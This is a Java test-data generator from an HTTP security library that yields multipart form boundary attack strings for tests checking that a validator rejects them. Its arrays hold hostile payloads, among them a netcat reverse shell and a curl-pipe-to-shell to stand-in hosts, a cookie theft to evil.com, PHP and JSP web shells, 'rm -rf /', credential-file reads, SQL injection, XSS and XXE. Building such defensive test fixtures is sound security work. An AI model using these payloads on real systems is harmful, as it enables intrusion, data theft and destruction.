/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;

import java.util.Arrays;
import java.util.List;

/**
 * Generator for multipart form boundary attack patterns.
 * 
 * <p>
 * This generator creates comprehensive multipart form boundary attack vectors
 * that attempt to manipulate HTTP multipart form data boundaries to bypass
 * security controls, inject malicious content, or perform various attacks
 * through multipart form data manipulation. The generator covers various
 * boundary injection techniques used by attackers to exploit web applications.
 * </p>
 * 
 * <h3>Attack Types Generated</h3>
 * <ul>
 *   <li><strong>Boundary Injection</strong> - Injects malicious boundaries to break parsing</li>
 *   <li><strong>Boundary Confusion</strong> - Uses malformed boundaries to confuse parsers</li>
 *   <li><strong>Nested Boundary Attacks</strong> - Creates nested multipart structures</li>
 *   <li><strong>Boundary Buffer Overflow</strong> - Uses extremely long boundaries</li>
 *   <li><strong>Content-Type Manipulation</strong> - Manipulates Content-Type headers</li>
 *   <li><strong>Filename Injection</strong> - Injects malicious filenames in form data</li>
 *   <li><strong>MIME Type Confusion</strong> - Uses incorrect or dangerous MIME types</li>
 *   <li><strong>Header Injection via Multipart</strong> - Injects headers through form data</li>
 *   <li><strong>Path Traversal in Forms</strong> - Path traversal through multipart fields</li>
 *   <li><strong>XSS via Form Fields</strong> - Script injection through multipart data</li>
 *   <li><strong>SQL Injection via Forms</strong> - Database injection through form fields</li>
 *   <li><strong>Command Injection Forms</strong> - System command injection attempts</li>
 *   <li><strong>File Upload Bypass</strong> - Attempts to bypass file upload restrictions</li>
 *   <li><strong>Encoding Bypass in Forms</strong> - Uses various encodings to bypass filters</li>
 *   <li><strong>Multipart DoS Attacks</strong> - Creates resource exhaustion patterns</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li>RFC 7578 - Returning Values from Forms: multipart/form-data</li>
 *   <li>RFC 2046 - Multipurpose Internet Mail Extensions (MIME) Part Two</li>
 *   <li>OWASP - File Upload Cheat Sheet</li>
 *   <li>OWASP Top 10 - Injection Attacks</li>
 *   <li>CWE-434 - Unrestricted Upload of File with Dangerous Type</li>
 *   <li>CWE-22 - Improper Limitation of a Pathname to a Restricted Directory</li>
 *   <li>CWE-400 - Uncontrolled Resource Consumption</li>
 * </ul>
 * 
 * <h3>Usage Example</h3>
 * <pre>
 * &#64;ParameterizedTest
 * &#64;TypeGeneratorSource(value = MultipartFormBoundaryAttackGenerator.class, count = 100)
 * void shouldRejectMultipartBoundaryAttacks(String multipartAttack) {
 *     assertThrows(UrlSecurityException.class, 
 *         () -> pipeline.validate(multipartAttack));
 * }
 * </pre>
 * 
 * Implements: Task T18 from HTTP verification specification
 * 
 * @author Claude Code Generator
 * @since 2.5
 */
public class MultipartFormBoundaryAttackGenerator implements TypedGenerator<String> {

    private static final List<String> BASE_PATTERNS = Arrays.asList(
            "/upload",
            "/form/submit",
            "/api/file",
            "/profile/image",
            "/document/upload",
            "/attachments",
            "/media/upload",
            "/files/create",
            "/import/data",
            "/admin/upload"
    );

    private final AttackTypeSelector attackTypeSelector = new AttackTypeSelector(15);

    @Override
    public String next() {
        String basePattern = BASE_PATTERNS.get(hashBasedSelection(BASE_PATTERNS.size()));

        return switch (attackTypeSelector.nextAttackType()) {
            case 0 -> createBoundaryInjectionAttack(basePattern);
            case 1 -> createBoundaryConfusionAttack(basePattern);
            case 2 -> createNestedBoundaryAttack(basePattern);
            case 3 -> createBoundaryBufferOverflow(basePattern);
            case 4 -> createContentTypeManipulation(basePattern);
            case 5 -> createFilenameInjectionAttack(basePattern);
            case 6 -> createMimeTypeConfusionAttack(basePattern);
            case 7 -> createHeaderInjectionViaMultipart(basePattern);
            case 8 -> createPathTraversalInForms(basePattern);
            case 9 -> createXssViaFormFields(basePattern);
            case 10 -> createSqlInjectionViaForms(basePattern);
            case 11 -> createCommandInjectionForms(basePattern);
            case 12 -> createFileUploadBypass(basePattern);
            case 13 -> createEncodingBypassInForms(basePattern);
            case 14 -> createMultipartDosAttack(basePattern);
            default -> createBoundaryInjectionAttack(basePattern);
        };
    }

    /**
     * Creates boundary injection attacks that manipulate multipart boundaries.
     */
    private String createBoundaryInjectionAttack(String pattern) {
        String[] boundaryInjections = {
                pattern + "?boundary=--normal%0d%0a--malicious%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
                pattern + "?data=test%0d%0a----WebKitFormBoundary%0d%0aContent-Disposition: form-data; name=\"admin\"%0d%0a%0d%0atrue",
                pattern + "?file=upload%0d%0a--boundary123%0d%0aContent-Type: application/x-executable%0d%0a%0d%0amalware_content",
                pattern + "?form=submit%0a%0a------WebKitFormBoundaryABC%0a%0aContent-Disposition: form-data; name=\"role\"%0a%0a%0a%0aadmin",
                pattern + "?multipart=data%0d%0a--CustomBoundary%0d%0aContent-Length: 999999%0d%0a%0d%0aoverflow_data",
                pattern + "?upload=file%0d%0a----FormBoundary%0d%0aContent-Transfer-Encoding: binary%0d%0a%0d%0a\u0000\u0001\u0002malicious",
                pattern + "?submit=form%0a%0a--boundary456%0a%0aContent-Disposition: attachment; filename=\"../../../etc/passwd\"",
                pattern + "?data=post%0d%0a--WebForm%0d%0aContent-Type: text/x-shellscript%0d%0a%0d%0a#!/bin/sh\nrm -rf /"
        };
        return boundaryInjections[hashBasedSelection(boundaryInjections.length)];
    }

    /**
     * Creates boundary confusion attacks with malformed boundaries.
     */
    private String createBoundaryConfusionAttack(String pattern) {
        String[] boundaryConfusions = {
                pattern + "?boundary=--normal--normal--malicious",
                pattern + "?data=test%0d%0a---%0d%0a---%0d%0aContent-Disposition: form-data; name=\"admin\"%0d%0a%0d%0atrue",
                pattern + "?form=data%0d%0a--%0d%0a--%0d%0a--%0d%0aContent-Type: text/html%0d%0a%0d%0a<iframe src=javascript:alert(1)>",
                pattern + "?upload=file%0a%0a--------%0a%0a---------%0a%0aContent-Length: -1",
                pattern + "?multipart=confusion%0d%0a--boundary--boundary%0d%0aContent-Disposition: ; name=\"\"",
                pattern + "?submit=form%0d%0a--%20%20--%20%20%0d%0aContent-Type: application/octet-stream%0d%0a%0d%0amalicious_binary",
                pattern + "?data=boundary%0a%0a--\t--\t%0a%0aContent-Encoding: gzip%0a%0acompressed_attack",
                pattern + "?file=upload%0d%0a-----%0d%0a-----%0d%0aContent-Disposition: form-data; name=\"path\"; filename=\"shell.php\""
        };
        return boundaryConfusions[hashBasedSelection(boundaryConfusions.length)];
    }

    /**
     * Creates nested boundary attacks with multiple levels of nesting.
     */
    private String createNestedBoundaryAttack(String pattern) {
        String[] nestedAttacks = {
                pattern + "?data=nested%0d%0a--outer%0d%0aContent-Type: multipart/mixed; boundary=inner%0d%0a%0d%0a--inner%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('nested')</script>%0d%0a--inner--%0d%0a--outer--",
                pattern + "?form=complex%0d%0a--level1%0d%0aContent-Type: multipart/alternative; boundary=level2%0d%0a%0d%0a--level2%0d%0aContent-Disposition: form-data; name=\"admin\"%0d%0a%0d%0atrue%0d%0a--level2--%0d%0a--level1--",
                pattern + "?upload=nested%0a%0a--main%0a%0aContent-Type: multipart/form-data; boundary=sub%0a%0a%0a%0a--sub%0a%0aContent-Transfer-Encoding: base64%0a%0a%0a%0aWFNTcGF5bG9hZA==%0a%0a--sub--%0a%0a--main--",
                pattern + "?multipart=deep%0d%0a--boundary1%0d%0aContent-Type: multipart/related; boundary=boundary2%0d%0a%0d%0a--boundary2%0d%0aContent-Type: application/x-executable%0d%0aContent-Disposition: attachment; filename=\"malware.exe\"%0d%0a%0d%0aMZ\u0090\u0000malicious%0d%0a--boundary2--%0d%0a--boundary1--",
                pattern + "?data=recursive%0d%0a--parent%0d%0aContent-Type: multipart/mixed; boundary=parent%0d%0a%0d%0a--parent%0d%0aContent-Disposition: form-data; name=\"loop\"%0d%0a%0d%0ainfinite_recursion%0d%0a--parent--%0d%0a--parent--",
                pattern + "?form=layered%0a%0a--outer123%0a%0aContent-Type: multipart/form-data; boundary=middle456%0a%0a%0a%0a--middle456%0a%0aContent-Type: multipart/alternative; boundary=inner789%0a%0a%0a%0a--inner789%0a%0aContent-Disposition: form-data; name=\"role\"%0a%0a%0a%0aroot%0a%0a--inner789--%0a%0a--middle456--%0a%0a--outer123--",
                pattern + "?upload=multiple%0d%0a--first%0d%0aContent-Type: multipart/mixed; boundary=second%0d%0a%0d%0a--second%0d%0aContent-Type: multipart/digest; boundary=third%0d%0a%0d%0a--third%0d%0aContent-Type: text/x-shellscript%0d%0a%0d%0a#!/bin/bash%0acat /etc/passwd%0d%0a--third--%0d%0a--second--%0d%0a--first--",
                pattern + "?complex=nesting%0d%0a--level0%0d%0aContent-Type: multipart/report; boundary=level1%0d%0a%0d%0a--level1%0d%0aContent-Type: multipart/form-data; boundary=level2%0d%0a%0d%0a--level2%0d%0aContent-Disposition: form-data; name=\"command\"%0d%0a%0d%0aid; whoami; uname -a%0d%0a--level2--%0d%0a--level1--%0d%0a--level0--"
        };
        return nestedAttacks[hashBasedSelection(nestedAttacks.length)];
    }

    /**
     * Creates boundary buffer overflow attacks with extremely long boundaries.
     */
    private String createBoundaryBufferOverflow(String pattern) {
        String longBoundary = Generators.letterStrings(1030, 1080).next(); // Just over STRICT limit
        String veryLongBoundary = Generators.letterStrings(4100, 4150).next(); // Just over DEFAULT limit  
        String extremeBoundary = Generators.letterStrings(8200, 8250).next(); // Just over LENIENT limit

        String[] overflowAttacks = {
                pattern + "?boundary=" + longBoundary,
                pattern + "?data=overflow%0d%0a--" + veryLongBoundary + "%0d%0aContent-Disposition: form-data; name=\"admin\"%0d%0a%0d%0atrue",
                pattern + "?form=large%0a%0a--" + extremeBoundary.substring(0, 4000) + "%0a%0aContent-Type: text/html%0a%0a%0a%0a<script>alert(1)</script>",
                pattern + "?upload=huge%0d%0a--" + longBoundary + "MALICIOUS%0d%0aContent-Length: 999999999%0d%0a%0d%0aoverflow_content",
                pattern + "?multipart=big%0d%0a--WebKitFormBoundary" + veryLongBoundary.substring(0, 2000) + "%0d%0aContent-Transfer-Encoding: quoted-printable%0d%0a%0d%0aattack_data",
                pattern + "?submit=massive%0a%0a--FormData" + extremeBoundary.substring(0, 1000) + "%0a%0aContent-Encoding: deflate%0a%0a%0a%0acompressed_attack",
                pattern + "?file=enormous%0d%0a--" + longBoundary + "XSS%0d%0aContent-Type: text/javascript%0d%0a%0d%0aalert('boundary_overflow')",
                pattern + "?data=giant%0d%0a--CustomBoundary" + veryLongBoundary.substring(0, 3000) + "%0d%0aContent-Disposition: attachment; filename=\"" + longBoundary.substring(0, 500) + ".exe\""
        };
        return overflowAttacks[hashBasedSelection(overflowAttacks.length)];
    }

    /**
     * Creates Content-Type manipulation attacks in multipart forms.
     */
    private String createContentTypeManipulation(String pattern) {
        String[] contentTypeAttacks = {
                pattern + "?data=test%0d%0a--boundary%0d%0aContent-Type: application/x-executable%0d%0aContent-Disposition: form-data; name=\"file\"; filename=\"virus.exe\"%0d%0a%0d%0aMZ\u0090\u0000malicious",
                pattern + "?upload=file%0d%0a--WebKit%0d%0aContent-Type: text/x-shellscript%0d%0aContent-Disposition: attachment; filename=\"shell.sh\"%0d%0a%0d%0a#!/bin/sh\nrm -rf /*",
                pattern + "?form=submit%0a%0a--FormData%0a%0aContent-Type: application/x-php%0a%0aContent-Disposition: form-data; name=\"upload\"; filename=\"backdoor.php\"%0a%0a%0a%0a<?php system($_GET['cmd']); ?>",
                pattern + "?multipart=data%0d%0a--boundary123%0d%0aContent-Type: application/javascript%0d%0aContent-Disposition: form-data; name=\"script\"%0d%0a%0d%0adocument.location='http://evil.com/steal?cookie='+document.cookie",
                pattern + "?file=upload%0d%0a--Custom%0d%0aContent-Type: text/html%0d%0aContent-Disposition: inline; filename=\"xss.html\"%0d%0a%0d%0a<script>alert(document.domain)</script>",
                pattern + "?data=post%0a%0a--WebForm%0a%0aContent-Type: application/x-httpd-php%0a%0aContent-Transfer-Encoding: base64%0a%0a%0a%0aPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=",
                pattern + "?submit=form%0d%0a--Boundary%0d%0aContent-Type: application/octet-stream%0d%0aContent-Encoding: gzip%0d%0aContent-Disposition: attachment; filename=\"malware.bin\"%0d%0a%0d%0a\u001f\u008b\u0008\u0000malicious_compressed_data",
                pattern + "?upload=dangerous%0d%0a--FormBoundary%0d%0aContent-Type: application/x-msdownload%0d%0aContent-Disposition: form-data; name=\"executable\"; filename=\"trojan.exe\"%0d%0a%0d%0aPE\u0000\u0000malicious_pe_header"
        };
        return contentTypeAttacks[hashBasedSelection(contentTypeAttacks.length)];
    }

    /**
     * Creates filename injection attacks in multipart forms.
     */
    private String createFilenameInjectionAttack(String pattern) {
        String[] filenameInjections = {
                pattern + "?upload=file%0d%0a--boundary%0d%0aContent-Disposition: form-data; name=\"file\"; filename=\"../../../etc/passwd\"%0d%0a%0d%0aroot:x:0:0:root:/root:/bin/bash",
                pattern + "?form=submit%0d%0a--WebKit%0d%0aContent-Disposition: attachment; filename=\"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\"%0d%0a%0d%0awindows_registry_data",
                pattern + "?data=upload%0a%0a--FormData%0a%0aContent-Disposition: form-data; name=\"document\"; filename=\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow\"%0a%0a%0a%0ashadow_file_content",
                pattern + "?multipart=file%0d%0a--Custom%0d%0aContent-Disposition: form-data; name=\"upload\"; filename=\"\\u0000shell.php\"%0d%0a%0d%0a<?php echo system($_GET['c']); ?>",
                pattern + "?file=post%0d%0a--boundary123%0d%0aContent-Disposition: attachment; filename=\"normal.txt%00.jsp\"%0d%0a%0d%0a<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                pattern + "?upload=data%0a%0a--WebForm%0a%0aContent-Disposition: form-data; name=\"file\"; filename=\"CON\"%0a%0a%0a%0awindows_device_attack",
                pattern + "?submit=form%0d%0a--Boundary%0d%0aContent-Disposition: inline; filename=\"script.js%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>%0d%0a\"%0d%0a%0d%0ajavascript_content",
                pattern + "?data=multipart%0d%0a--FormBoundary%0d%0aContent-Disposition: form-data; name=\"attachment\"; filename=\"very_long_filename_" + Generators.letterStrings(200, 300).next() + ".txt\"%0d%0a%0d%0abuffer_overflow_filename"
        };
        return filenameInjections[hashBasedSelection(filenameInjections.length)];
    }

    /**
     * Creates MIME type confusion attacks.
     */
    private String createMimeTypeConfusionAttack(String pattern) {
        String[] mimeConfusions = {
                pattern + "?upload=file%0d%0a--boundary%0d%0aContent-Type: image/jpeg%0d%0aContent-Disposition: form-data; name=\"image\"; filename=\"image.jpg\"%0d%0a%0d%0a<?php system($_GET['cmd']); ?>",
                pattern + "?form=submit%0d%0a--WebKit%0d%0aContent-Type: text/plain%0d%0aContent-Disposition: attachment; filename=\"document.txt\"%0d%0a%0d%0a<script>alert('mime_confusion')</script>",
                pattern + "?data=upload%0a%0a--FormData%0a%0aContent-Type: application/pdf%0a%0aContent-Disposition: form-data; name=\"pdf\"; filename=\"document.pdf\"%0a%0a%0a%0a#!/bin/bash%0acat /etc/passwd",
                pattern + "?multipart=file%0d%0a--Custom%0d%0aContent-Type: audio/mpeg%0d%0aContent-Disposition: form-data; name=\"music\"; filename=\"song.mp3\"%0d%0a%0d%0aMZ\u0090\u0000executable_disguised_as_audio",
                pattern + "?file=post%0d%0a--boundary123%0d%0aContent-Type: video/mp4%0d%0aContent-Disposition: attachment; filename=\"movie.mp4\"%0d%0a%0d%0a%PDF-1.4malicious_pdf_disguised_as_video",
                pattern + "?upload=data%0a%0a--WebForm%0a%0aContent-Type: application/json%0a%0aContent-Disposition: form-data; name=\"config\"%0a%0a%0a%0a{\"admin\": true, \"role\": \"root\", \"execute\": \"rm -rf /\"}",
                pattern + "?submit=form%0d%0a--Boundary%0d%0aContent-Type: text/csv%0d%0aContent-Disposition: inline; filename=\"data.csv\"%0d%0a%0d%0a=cmd|'/c calc'!A1",
                pattern + "?data=multipart%0d%0a--FormBoundary%0d%0aContent-Type: application/xml%0d%0aContent-Disposition: form-data; name=\"xml\"%0d%0a%0d%0a<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
        };
        return mimeConfusions[hashBasedSelection(mimeConfusions.length)];
    }

    /**
     * Creates header injection attacks via multipart form data.
     */
    private String createHeaderInjectionViaMultipart(String pattern) {
        String[] headerInjections = {
                pattern + "?data=test%0d%0a--boundary%0d%0aContent-Disposition: form-data; name=\"user\"%0d%0aX-Admin: true%0d%0a%0d%0aguest",
                pattern + "?form=submit%0d%0a--WebKit%0d%0aContent-Disposition: attachment; filename=\"file.txt\"%0d%0aSet-Cookie: admin=true%0d%0a%0d%0anormal_content",
                pattern + "?upload=file%0a%0a--FormData%0a%0aContent-Disposition: form-data; name=\"data\"%0a%0aAuthorization: Bearer admin_token%0a%0a%0a%0aform_data",
                pattern + "?multipart=data%0d%0a--Custom%0d%0aContent-Disposition: form-data; name=\"field\"%0d%0aLocation: http://evil.com%0d%0a%0d%0afield_value",
                pattern + "?file=post%0d%0a--boundary123%0d%0aContent-Disposition: inline%0d%0aContent-Length: 999999%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0aGET /admin HTTP/1.1",
                pattern + "?data=upload%0a%0a--WebForm%0a%0aContent-Disposition: form-data; name=\"input\"%0a%0aX-Forwarded-For: 127.0.0.1%0a%0aContent-Type: text/html%0a%0a%0a%0a<script>alert(1)</script>",
                pattern + "?submit=form%0d%0a--Boundary%0d%0aContent-Disposition: attachment; filename=\"test.txt\"%0d%0aCache-Control: no-cache%0d%0aContent-Security-Policy: script-src 'unsafe-eval'%0d%0a%0d%0afile_content",
                pattern + "?upload=multipart%0d%0a--FormBoundary%0d%0aContent-Disposition: form-data; name=\"value\"%0d%0aX-Real-IP: 192.168.1.1%0d%0aHost: internal-admin.local%0d%0a%0d%0aform_value"
        };
        return headerInjections[hashBasedSelection(headerInjections.length)];
    }

    /**
     * Creates path traversal attacks via multipart form fields.
     */
    private String createPathTraversalInForms(String pattern) {
        String[] pathTraversalAttacks = {
                pattern + "?data=../../../etc/passwd",
                pattern + "?file=..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
                pattern + "?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
                pattern + "?directory=....//....//....//etc//hosts",
                pattern + "?folder=..%252f..%252f..%252fetc%252fpasswd",
                pattern + "?location=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                pattern + "?target=\u002e\u002e\u002f\u002e\u002e\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064",
                pattern + "?upload=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        };
        return pathTraversalAttacks[hashBasedSelection(pathTraversalAttacks.length)];
    }

    /**
     * Creates XSS injection attacks via multipart form fields.
     */
    private String createXssViaFormFields(String pattern) {
        String[] xssAttacks = {
                pattern + "?field=%3cscript%3ealert(1)%3c/script%3e",
                pattern + "?input=javascript:alert('XSS')",
                pattern + "?data=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e",
                pattern + "?value=%3cimg%20src=x%20onerror=alert(1)%3e",
                pattern + "?content=%3csvg%20onload=alert('form_xss')%3e%3c/svg%3e",
                pattern + "?text=%27%3e%3cscript%3eeval(atob('YWxlcnQoMSk='))%3c/script%3e",
                pattern + "?name=%3ciframe%20src=javascript:alert(1)%3e%3c/iframe%3e",
                pattern + "?description=%3cscript%20src=http://evil.com/xss.js%3e%3c/script%3e"
        };
        return xssAttacks[hashBasedSelection(xssAttacks.length)];
    }

    /**
     * Creates SQL injection attacks via multipart form fields.
     */
    private String createSqlInjectionViaForms(String pattern) {
        String[] sqlInjections = {
                pattern + "?field='; DROP TABLE users; --",
                pattern + "?input=admin' OR '1'='1",
                pattern + "?data=1' UNION SELECT password FROM admin_users --",
                pattern + "?value='; INSERT INTO users VALUES ('hacker','password'); --",
                pattern + "?content=' OR 1=1; UPDATE users SET role='admin' WHERE id=1; --",
                pattern + "?text=1'; EXEC xp_cmdshell('whoami'); --",
                pattern + "?name=' UNION SELECT credit_card FROM payments --",
                pattern + "?description='; CREATE USER hacker IDENTIFIED BY 'password'; --"
        };
        return sqlInjections[hashBasedSelection(sqlInjections.length)];
    }

    /**
     * Creates command injection attacks via multipart form fields.
     */
    private String createCommandInjectionForms(String pattern) {
        String[] commandInjections = {
                pattern + "?field=test; cat /etc/passwd",
                pattern + "?input=user`whoami`",
                pattern + "?data=value$(id)",
                pattern + "?content=text|ls -la",
                pattern + "?name=data; rm -rf /*",
                pattern + "?value=param`nc -e /bin/sh attacker.com 4444`",
                pattern + "?text=input$(curl http://evil.com/malware.sh | sh)",
                pattern + "?description=field; python -c 'import os; os.system(\"cat /etc/shadow\")'"
        };
        return commandInjections[hashBasedSelection(commandInjections.length)];
    }

    /**
     * Creates file upload bypass attacks.
     */
    private String createFileUploadBypass(String pattern) {
        String[] uploadBypasses = {
                pattern + "?file=shell.php%00.jpg",
                pattern + "?upload=backdoor.jsp%00.png",
                pattern + "?attachment=malware.exe%00.txt",
                pattern + "?document=script.js%00.pdf",
                pattern + "?image=payload.php.jpg",
                pattern + "?media=trojan.exe.mp3",
                pattern + "?content=webshell.asp.gif",
                pattern + "?data=exploit.py.log"
        };
        return uploadBypasses[hashBasedSelection(uploadBypasses.length)];
    }

    /**
     * Creates encoding bypass attacks in multipart forms.
     */
    private String createEncodingBypassInForms(String pattern) {
        String[] encodingBypasses = {
                pattern + "?field=%253cscript%253ealert(1)%253c/script%253e", // Double URL encoding
                pattern + "?input=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", // Unicode encoding
                pattern + "?data=%2500%2500admin=true", // Null byte encoding
                pattern + "?value=\u202e<script>alert(1)</script>", // Right-to-left override
                pattern + "?content=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd", // UTF-8 overlong
                pattern + "?text=&#60;script&#62;alert(1)&#60;/script&#62;", // HTML entities
                pattern + "?name=%u003cscript%u003ealert(1)%u003c/script%u003e", // Unicode percent encoding
                pattern + "?description=\\x3cscript\\x3ealert(1)\\x3c/script\\x3e" // Hex encoding
        };
        return encodingBypasses[hashBasedSelection(encodingBypasses.length)];
    }

    /**
     * Creates multipart DoS attacks that cause resource exhaustion.
     */
    private String createMultipartDosAttack(String pattern) {
        // Create DoS attack patterns within realistic URL length limits
        int attackType = hashBasedSelection(8);
        return switch (attackType) {
            case 0 -> pattern + "?parts=" + Generators.strings("part1&", 80, 120).next() + "admin=true";
            case 1 -> pattern + "?fields=" + Generators.letterStrings(1500, 2000).next();
            case 2 -> pattern + "?data=" + Generators.strings("field=value&", 40, 80).next() + "role=admin";
            case 3 -> pattern + "?content=" + Generators.letterStrings(800, 1000).next() + "%0d%0a--boundary" + Generators.strings("--boundary", 20, 40).next();
            case 4 -> pattern + "?multipart=" + Generators.letterStrings(8000, 8200).next(); // Near LENIENT limit
            case 5 -> pattern + "?form=" + "input" + Generators.letterStrings(1000, 1500).next() + "=value";
            case 6 -> pattern + "?upload=" + Generators.letterStrings(1000, 1200).next() + "&file=" + Generators.letterStrings(1000, 1200).next();
            case 7 -> pattern + "?boundary=" + Generators.strings("--boundary", 50, 100).next() + Generators.letterStrings(500, 800).next();
            default -> pattern + "?parts=" + Generators.strings("part1&", 80, 120).next() + "admin=true";
        };
    }

    @Override
    public Class<String> getType() {
        return String.class;
    }

    /**
     * Creates hash-based selection for deterministic but varied attack patterns.
     */
    private int hashBasedSelection(int bound) {
        return Math.abs((int) (this.hashCode() + System.nanoTime())) % bound;
    }

    /**
     * Helper class to cycle through attack types systematically.
     */
    private static class AttackTypeSelector {
        private final int maxTypes;
        private int currentType = 0;

        AttackTypeSelector(int maxTypes) {
            this.maxTypes = maxTypes;
        }

        int nextAttackType() {
            int type = currentType;
            currentType = (currentType + 1) % maxTypes;
            return type;
        }
    }
}